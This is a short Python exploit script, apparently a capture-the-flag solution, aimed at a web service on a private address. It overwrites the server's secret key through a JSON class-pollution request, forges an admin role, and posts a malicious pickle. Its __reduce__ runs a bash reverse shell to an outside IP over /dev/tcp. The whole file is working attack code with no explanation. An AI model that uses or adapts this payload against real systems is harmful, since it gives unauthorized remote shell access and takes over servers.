import requests
import base64
import pickle
from verify import *


url="http://192.168.20.128:40122/"

def index(key):
    data={
            "__init__":{
                "__globals__":{
                    "User":{
                        "key":base64.b64encode(key)
                    }
                }
            }
        }
    res=requests.post(url=url,json=data)
    print(res.text)

def login(key): 
    class EXP():
        def __reduce__(self):
            command=r"__import__('os').system('bash -c \"bash -i >& /dev/tcp/8.138.10.69/9090 0>&1\"')"
            return (eval,(command,)) 
    
    p=EXP()
    op=pickle.dumps(p)
    b64op=base64.b64encode(op)
    # print(b64op)

    user=User()
    enc=user.encrypt("admin",key)
    # print(enc)

    data={
        "role":enc,
        "data":b64op
    }
    r=requests.post(url=url+"login",data=data)
    print(r.text)

if __name__=="__main__":
    key=os.urandom(16)
    index(key)
    login(key)